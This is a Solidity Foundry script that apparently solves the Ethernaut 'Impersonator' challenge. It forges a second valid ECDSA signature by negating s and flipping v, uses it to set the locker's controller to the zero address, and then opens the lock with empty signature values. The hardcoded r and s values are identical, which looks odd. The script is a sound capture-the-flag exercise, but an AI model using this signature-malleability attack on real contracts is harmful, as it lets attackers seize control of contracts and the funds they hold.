// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/Impersonator.sol";
import {Script} from "forge-std/Script.sol";

contract ImpersonatorAttack is Script {
    Impersonator public impersonator = Impersonator(0xEEEfE8acA8612095Ca5619dAa11e269217f5c6d5);

    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    // await contract.lockers(0)
    ECLocker public ecLocker = ECLocker(0x0CDFaBA7dBAF2C6580138613c85066B1b7d0B771);

    function createInverse(
        bytes32 r,
        bytes32 s,
        uint8 v
    ) public pure returns (bytes32, bytes32, uint8) {
        bytes32 negS = bytes32(N - uint256(s));
        uint8 vPrime = (v == 27) ? 28 : 27;

        return (r, negS, vPrime);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        uint8 v = 27;
        bytes32 r = 0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae;
        bytes32 s = 0xf413212ad6f041d7bf56f97eb34b619bf39a937e1c2647ba2d306351c6d34aae;

        (bytes32 rPrime, bytes32 negS, uint8 vPrime) = createInverse(r, s, v);

        ecLocker.changeController(vPrime, rPrime, negS, address(0));

        ecLocker.open(100, 0x00, 0x00);

        vm.stopBroadcast();
    }
}